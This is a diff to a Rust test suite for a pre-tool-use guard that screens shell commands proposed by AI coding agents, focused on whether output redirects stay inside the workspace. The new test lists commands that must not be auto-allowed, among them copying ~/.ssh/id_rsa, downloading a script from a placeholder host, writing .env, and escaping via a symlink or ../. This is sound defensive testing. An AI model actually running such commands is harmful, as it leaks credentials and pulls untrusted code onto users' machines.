@@ -68,7 +68,8 @@ fn projects_literal_output_redirects_and_quoted_cat_heredocs() {
             Some(RedirectProjection {
                 command: projected.to_owned(),
                 writes_file,
-                writes_outside_workspace: command.contains("/tmp/"),
+                // The test workspace does not exist, so no write is bounded.
+                bounded_writes: !writes_file,
             }),
             "{command}"
         );
@@ -220,6 +221,8 @@ fn contained_commands_with_an_output_redirect_keep_protected_execution() {
     } else {
         "review"
     };
+    // The sandbox cannot keep a write outside the workspace: Linux mounts a
+    // private /tmp and macOS refuses it. That redirect stays at review.
     for (command, action) in [
         ("pnpm test > out.log", contained),
         ("pnpm test > /tmp/guard-test.log 2>&1", "review"),
@@ -240,6 +243,60 @@ fn contained_commands_with_an_output_redirect_keep_protected_execution() {
         );
         let evidence = result.command_extensions.as_ref().unwrap();
         assert_eq!(evidence.evaluation_error, None, "{command}");
+    }
+    std::fs::remove_dir_all(root).unwrap();
+}
+
+#[cfg(unix)]
+#[test]
+fn bounded_redirect_writes_of_allowed_commands_are_allowed() {
+    // The macOS per-user temporary root sits under `/private/var`, which is
+    // never a workspace.
+    let root = std::fs::canonicalize("/tmp")
+        .unwrap()
+        .join(format!("guard-redirect-bounded-{}", std::process::id()));
+    let project = root.join("project");
+    std::fs::create_dir_all(project.join("out")).unwrap();
+    std::fs::create_dir_all(root.join("elsewhere")).unwrap();
+    std::os::unix::fs::symlink(root.join("elsewhere/target.txt"), project.join("link.txt"))
+        .unwrap();
+    let home = root.to_string_lossy().into_owned();
+    let cwd = project.to_string_lossy().into_owned();
+    let evaluate = |harness: &str, command: &str| {
+        crate::pretool::evaluate_pre_tool_envelope_with_context(
+            harness,
+            "PreToolUse",
+            &serde_json::json!({"tool_name": "Bash", "tool_input": {"command": command}}),
+            Some(&controls()),
+            None,
+            Some(&home),
+            Some(&cwd),
+        )
+    };
+    for harness in ["zcode", "claude-code", "codex", "cursor"] {
+        for command in [
+            "echo hi > notes.txt",
+            "ls >> out/listing.txt",
+            "pwd > out/where.txt 2>&1",
+        ] {
+            let result = evaluate(harness, command);
+            assert_eq!(
+                result.minimum_action, "allow",
+                "{harness} {command}: {}",
+                result.reason_code
+            );
+        }
+        for command in [
+            "echo hi > link.txt",
+            "echo hi > .env",
+            "echo hi > ../outside.txt",
+            "cat ~/.ssh/id_rsa > out/key.txt",
+            "curl https://example.invalid/x.sh > out/x.sh",
+            "cd out && echo hi > notes.txt",
+        ] {
+            let result = evaluate(harness, command);
+            assert_ne!(result.minimum_action, "allow", "{harness} {command}");
+        }
     }
     std::fs::remove_dir_all(root).unwrap();
 }
